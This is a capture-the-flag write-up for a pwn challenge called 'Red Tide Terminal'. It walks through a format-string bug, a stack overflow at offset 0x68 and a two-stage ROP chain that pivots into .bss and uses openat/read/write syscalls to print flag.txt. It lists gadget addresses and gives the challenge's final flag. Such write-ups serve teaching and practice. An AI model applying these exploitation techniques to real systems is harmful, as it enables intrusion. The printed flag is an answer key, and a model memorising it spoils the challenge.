# Junior Crypt 2026 CTF — `Red Tide Terminal` Writeup

- **Author:** Efe Sahinbas
- **GitHub Repository:** [MacallanTheRoot/ctf-writeups](https://github.com/MacallanTheRoot/ctf-writeups/)

**Category:** Pwn  
**Target:** `red_tide_terminal`  
**Remote:** `10.112.0.12:48804`  
**Flag format:** `grodno{...}`

---

## Challenge Description

```text
An abandoned coastal command terminal has reappeared on a live network map after years of silence.
Now it responds again, but only briefly, and every connection ends with the same cold message about awaiting authorized personnel.
Reach the terminal core and recover the flag.
```

---

## Summary

The binary was a 64-bit Linux ELF with NX, Full RELRO, PIE locally, and stack canaries. The remote service used a non-PIE layout with fixed code addresses.

The program first asked for a codename and printed it with `printf(codename)`, giving a format-string bug. The second stage asked for a packet length and read too much data into a stack buffer. The remote build allowed control of the return address at offset `0x68`.

The final exploit used a two-stage ROP chain:

1. Use the first stack overflow to call `read(0, path_buf, 0x300)`.
2. Pivot the stack into `.bss` with `leave; ret`.
3. Run an ORW chain with `openat`, `read`, and `write`.
4. Open `flag.txt` and print the flag.

Final flag:

```text
grodno{2e66eeda-bc51-406d-8373-422b3462fed9}
```

---

## 1. Initial Binary Triage

The usual checks showed a protected x86-64 ELF:

```bash
file red_tide_terminal
checksec --file=red_tide_terminal
```

Relevant protections:

```text
Full RELRO
Stack Canary
NX enabled
PIE enabled locally
```

The useful symbols were still present:

```text
pop_rdi_ret  0x13b0
pop_rsi_ret  0x13b5
pop_rdx_ret  0x13ba
pop_rax_ret  0x13bf
syscall_ret  0x13c4
leave_ret    0x13ae
path_buf     0x4060
io_buf       0x4080
```

---

## 2. Program Behavior

The service printed a banner and asked for a codename:

```text
== Red Tide Terminal ==
Codename:
```

The codename was later printed as:

```c
printf(codename);
```

This created a format-string primitive. After that, the program entered the packet handler:

```text
Packet length:
Packet data:
```

The packet handler accepted lengths up to `0xf0`, but the stack buffer was smaller than that. This made the packet input the main control-flow hijack point.

---

## 3. Remote Layout Difference

The local binary was PIE, but the remote process leaked fixed-looking addresses such as:

```text
0x40159a
0x401579
```

That indicated the remote challenge binary was mapped at a fixed `0x400000` base. The exploit therefore used absolute remote addresses:

```text
pop rdi; ret  0x4013b0
pop rsi; ret  0x4013b5
pop rdx; ret  0x4013ba
pop rax; ret  0x4013bf
syscall; ret  0x4013c4
pop rbp; ret  0x4011a4
leave; ret    0x4013ae
path_buf      0x404060
io_buf        0x404080
```

---

## 4. Finding Control

The remote return-address offset was confirmed as:

```text
0x68
```

A short test returning into the route handler produced another `Packet length:` prompt, proving that RIP control was reached.

The payload layout was:

```text
"A" * 0x68
ROP chain
```

The packet length limit was still enough for a compact first-stage ROP chain.

---

## 5. Stage 1: Read and Pivot

The first stage read the real ROP chain into `.bss`, then pivoted there:

```text
read(0, path_buf, 0x300)
rbp = path_buf
leave; ret
```

This avoided the small packet-size limit. The first packet only needed to contain the stack pivot setup.

---

## 6. Stage 2: ORW Chain

The second stage ran directly from `.bss`:

```text
openat(AT_FDCWD, "flag.txt", 0)
read(3, io_buf, 0x100)
write(1, io_buf, 0x100)
exit(0)
```

Because only a small seccomp allowlist was available, the exploit used raw syscalls instead of libc helpers.

The allowed syscalls were enough:

```text
read
write
openat
exit
exit_group
```

---

## 7. Getting the Flag

After sending the first-stage overflow and then the second-stage `.bss` ROP payload, the service printed:

```text
grodno{2e66eeda-bc51-406d-8373-422b3462fed9}
```

---

## 8. Conclusion

The challenge combined a misleading format-string bug with a more useful stack overflow. The important steps were:

```text
1. Identify the packet overflow.
2. Notice that the remote binary used fixed addresses.
3. Fit a small read-and-pivot chain under the packet length limit.
4. Move the full ORW chain to .bss.
5. Read and print flag.txt with allowed syscalls.
```
